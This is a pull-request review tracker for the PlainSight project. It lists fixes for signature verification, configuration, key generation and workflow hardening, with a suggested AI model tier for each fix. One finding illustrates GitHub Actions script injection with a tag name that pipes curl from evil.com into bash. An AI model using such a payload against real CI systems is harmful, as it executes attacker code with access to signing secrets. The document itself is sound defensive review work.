# Issue #38 — Review Findings & Fix Tracker

**PR:** [#39](https://github.com/glensouza/PlainSight/pull/39)
**Branch:** `feature/issue-38-version-automation`
**Generated:** 2026-05-03 (Opus 4.7 review + security-review skill + parallel false-positive filter agents)

## How to use this file

- Items are checkboxes. Tick `[x]` as you complete each.
- "Suggested model" is a cost recommendation — pick the cheapest tier that can plausibly do the work right.
- Cost order, cheap → expensive: **Gemini CLI → Haiku 4.5 → Sonnet 4.6 → Opus 4.7**.
- Brief each model with: this file, the specific item number, and the relevant file paths. Don't ask it to "fix everything" — one item at a time.
- After each fix: `dotnet build`, ideally a tag-driven smoke test, then check the box and commit.

---

## Critical — must fix; the feature does not work without these

### 1. [ ] Canonical-JSON re-serialisation breaks ECDSA verification

**File:** `src/PlainSight.Server/Services/Versioning/ManifestReconciler.cs` (lines ~82–93, ~159–216)

**Problem:** The verifier rebuilds canonical JSON via `System.Text.Json` to match what `jq --sort-keys --compact-output` produced in CI. Two byte-divergences:

1. **DateTime round-trip.** `signedAt` is typed `DateTime`; STJ's default `O` round-trip format emits `"2026-05-03T14:22:00.0000000Z"`. The CI emits `"2026-05-03T14:22:00Z"` via `date -u +%Y-%m-%dT%H:%M:%SZ`. Different bytes → ECDSA always fails.
2. **String escaping.** STJ default escapes `<`, `>`, `&`, `+`, `'` to `<`-form. `jq` does not. Empty `notes` makes this latent today; surfaces the moment release notes flow through.

**Fix:**
- Change `Manifest.SignedAt` and `CanonicalManifest.SignedAt` from `DateTime` to `string`. Preserves the original byte form.
- Construct a `JsonSerializerOptions` with `Encoder = JavaScriptEncoder.UnsafeRelaxedJsonEscaping`, `WriteIndented = false`, and use it for canonical serialisation. Add via `JsonSourceGenerationOptions` on `CanonicalJsonContext` if keeping source-gen.

**Validation:** Add a unit test that openssl-signs a fixture manifest (using a test keypair under `tests/Fixtures/`) and round-trips through `SignatureVerifier.VerifyDer`. Without this test the regression will return.

**Suggested model:** **Sonnet 4.6.** Touches model + serializer options + needs a fixture-based unit test. Gemini CLI can do the model/options edit but won't iterate on test failures.

---

### 2. [ ] Reconciler reads wrong configuration key

**File:** `src/PlainSight.Server/Services/Versioning/ManifestReconciler.cs` (lines 38–39)

**Problem:** Reads `PlayerVersions:UpdatesPath` and `PlayerVersions:PublicKeyPath`. The rest of the codebase (`Program.cs:173`, `Api/UpdateApi.cs:22`, `Api/ContentApi.cs`, `Components/Pages/Versions.razor:266`) reads top-level `UpdatesPath`. With current `appsettings.json`, the reconciler falls through to `AppContext.BaseDirectory/Updates` and never sees the share.

**Fix:**
```csharp
_updatesPath = _configuration["UpdatesPath"] ?? "/mnt/plainsight/updates";
_publicKeyPath = _configuration["PublicKeyPath"]
    ?? Path.Combine(AppContext.BaseDirectory, "Keys", "release-signing.pub");
```

**Suggested model:** **Gemini CLI.** Two-line mechanical fix.

---

### 3. [ ] Generate and commit the real `release-signing.pub`

**File:** `src/PlainSight.Server/Keys/release-signing.pub` (does not exist)

**Problem:** The public key was not committed (the sub-agent's fabricated stand-in was discarded). Without it, `SignatureVerifier` constructor throws or `ManifestReconciler.ReconcileAsync` returns 0 silently every minute.

**Fix (manual, off-machine):**
```bash
openssl ecparam -name prime256v1 -genkey -noout -out signing.key
openssl pkcs8 -topk8 -nocrypt -in signing.key -out signing.pkcs8
openssl ec -in signing.key -pubout -out release-signing.pub
```
1. Add the contents of `signing.pkcs8` as repo secret `PLAINSIGHT_SIGNING_KEY`.
2. Commit `release-signing.pub` to `src/PlainSight.Server/Keys/`.
3. Destroy `signing.key` and `signing.pkcs8` locally after the secret is set.
4. While you're there, also set repo variable `UPDATES_PATH` to your share path (e.g. `/mnt/plainsight-share/updates`).

**Suggested model:** **None — manual.** Cannot be delegated to any model. Private key must never enter a chat transcript.

---

## High — defense-in-depth, real attack surface

### 4. [ ] GitHub Actions: `${{ ... }}` interpolated directly into shell scripts

**File:** `.github/workflows/build-deploy.yml`

**Problem:** Multiple `run:` blocks bake `${{ github.ref_name }}` and `${{ vars.UPDATES_PATH }}` directly into the shell script body. A maintainer (or compromised maintainer account) creating a tag like `v1.0.0$(curl evil.com|bash)` would get arbitrary code execution on the self-hosted runner — which has access to `secrets.PLAINSIGHT_SIGNING_KEY`. Tag-name script injection is a well-documented class of GitHub Actions bug.

**Fix:** Pass via `env:` at the step level; reference as shell vars:
```yaml
- name: Copy binary to share
  env:
    REF_NAME: ${{ github.ref_name }}
    UPDATES_PATH_RAW: ${{ vars.UPDATES_PATH }}
  run: |
    set -euo pipefail
    VERSION="${REF_NAME#v}"
    UPDATES_PATH="$UPDATES_PATH_RAW"
    ...
```

Apply to **every** new step that uses `${{ github.* }}` or `${{ vars.* }}` in `run:` (Validate UPDATES_PATH, Copy binary to share, Build and sign manifest, the tarball step). The `${{ secrets.PLAINSIGHT_SIGNING_KEY }}` already uses `env:` correctly — keep that pattern.

**Suggested model:** **Gemini CLI** or **Haiku 4.5.** Mechanical YAML refactor across ~5 steps.

---

## Medium — correctness, plan deviations

### 5. [ ] `SignatureVerifier` reconstructed every reconcile tick

**File:** `src/PlainSight.Server/Services/Versioning/ManifestReconciler.cs:59`, `Program.cs:65–66`

**Problem:** Plan §3 Decision F said load PEM once at startup. Today: `using SignatureVerifier verifier = new SignatureVerifier(_publicKeyPath);` inside every `ReconcileAsync` call. Re-reads disk every minute.

**Fix:**
1. Remove `IDisposable` from `SignatureVerifier`. Keep the `ECDsa` field for the lifetime of the singleton.
2. In `Program.cs`: `builder.Services.AddSingleton<SignatureVerifier>(sp => new SignatureVerifier(sp.GetRequiredService<IConfiguration>()["PublicKeyPath"] ?? Path.Combine(AppContext.BaseDirectory, "Keys", "release-signing.pub")));`
3. Inject `SignatureVerifier` into `ManifestReconciler`'s constructor; drop the `_publicKeyPath` field.

**Suggested model:** **Haiku 4.5.** Small DI refactor in 2 files.

---

### 6. [ ] `notes` field not truncated to 1k chars

**File:** `src/PlainSight.Server/Services/Versioning/ManifestReconciler.cs:125`

**Problem:** Plan §4 Task 3: `Notes = release.Body` truncated to 1k chars. Currently stores raw value. Today moot (CI emits `""`); breaks the moment release notes flow through.

**Fix:**
```csharp
Notes = manifest.Notes is { Length: > 1024 } n ? n[..1024] : manifest.Notes
```

**Suggested model:** **Gemini CLI.** Single-line.

---

## Low — quality / cosmetic

### 7. [ ] `VersionApi` logger category looks misnamed

**File:** `src/PlainSight.Server/Api/VersionApi.cs:17`

**Problem:** `ILogger<IPlayerVersionReconciler>` reads as if `VersionApi` is logging "as" the reconciler.

**Fix:** Resolve `ILoggerFactory`, call `CreateLogger("VersionApi")`. Or just inject `ILogger<VersionApi>` even though the class is static — handlers can take it via `[FromServices]`.

**Suggested model:** **Gemini CLI.** Trivial.

---

### 8. [ ] `using var context` violates project rule (pre-existing, but affected file)

**File:** `src/PlainSight.Server/Components/Pages/Versions.razor` (lines 206, 254, 296, 352)

**Problem:** Project rule "explicit types only, never use `var`". Pre-existing in this file but worth a sweep while it's open.

**Fix:** `using PlainSightDbContext context = await DbFactory.CreateDbContextAsync();`

**Suggested model:** **Gemini CLI.** 4-line replace-all.

---

### 9. [ ] `ReconciliationBackgroundService.RunReconciliationAsync` discards the count

**File:** `src/PlainSight.Server/Services/Versioning/ReconciliationBackgroundService.cs:64–71`

**Problem:** `await reconciler.ReconcileAsync(ct)` return value goes nowhere. `ManifestReconciler` already logs internally, so this is fine, but a debug log here would help when watching the service start up.

**Fix:** Capture into a local and `LogDebug("Tick ingested {Count} versions.", ingested)`. Or skip — purely optional.

**Suggested model:** **Gemini CLI** if you do it.

---

## Security review — net result

The `/security-review` skill produced 6 candidate findings. After parallel false-positive filter agents (confidence ≥ 8 to keep):

| # | Finding | Filter verdict | Disposition |
|---|---|---|---|
| 1 | Sig mismatch DateTime/escape | FALSE_POSITIVE @ 9 — correctness bug, not exploitable; verify-rejects don't help an attacker | Tracked above as item **#1** (correctness, not security) |
| 2 | `UpdateApi` path traversal | FALSE_POSITIVE @ 9 — file unchanged by this PR; reconciler validates `FileName` at insert | Pre-existing, out of scope |
| 3 | `VersionApi` bare `RequireAuthorization()` | FALSE_POSITIVE @ 9 — matches every other endpoint; reconciler crypto checks bound the blast radius | Out of scope (no admin-policy infra exists) |
| 4 | GH Actions tag-name injection | TRUE — defense-in-depth | Tracked above as item **#4** |
| 5 | Reconciler `Path.GetFullPath` containment | Theoretical (Windows-only NTFS edge cases on a Linux deployment) | Skip |
| 6 | `DeleteVersion` path containment | Requires prior DB compromise; admin-authed | Skip |

**Net new security findings introduced by this PR: one (item #4).**

---

## Suggested fix order

1. **#3** keypair generation (manual; unblocks everything) →
2. **#2** config-key fix (1-line; trivial) →
3. **#1** canonical-JSON fix + unit test (the load-bearing one) →
4. **#4** GH Actions `env:` refactor →
5. **#5, #6** in any order →
6. **#7, #8, #9** as time permits or roll into the next sweep.

After **#1–#4** are done and a test tag round-trips end-to-end, the PR is mergeable. Items 5–9 are nice-to-have polish.
